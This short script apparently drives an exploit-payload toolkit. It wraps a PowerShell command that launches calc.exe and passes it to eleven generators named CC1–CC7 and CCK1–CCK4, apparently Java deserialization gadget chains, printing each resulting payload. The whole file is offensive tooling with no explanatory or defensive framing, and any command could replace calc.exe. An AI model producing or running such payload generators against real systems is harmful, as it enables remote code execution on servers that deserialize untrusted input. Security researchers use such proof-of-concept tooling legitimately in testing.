#include "payload"
#include "tool"

cmd = tool::getPowershellCommand("calc.exe");
cc1 = payload::getCC1(cmd);
print(cc1);

cc2 = payload::getCC2(cmd);
print(cc2);

cc3 = payload::getCC3(cmd);
print(cc3);

cc4 = payload::getCC4(cmd);
print(cc4);

cc5 = payload::getCC5(cmd);
print(cc5);

cc6 = payload::getCC6(cmd);
print(cc6);

cc7 = payload::getCC7(cmd);
print(cc7);

cck1 = payload::getCCK1(cmd);
print(cck1);

cck2 = payload::getCCK2(cmd);
print(cck2);

cck3 = payload::getCCK3(cmd);
print(cck3);

cck4 = payload::getCCK4(cmd);
print(cck4);
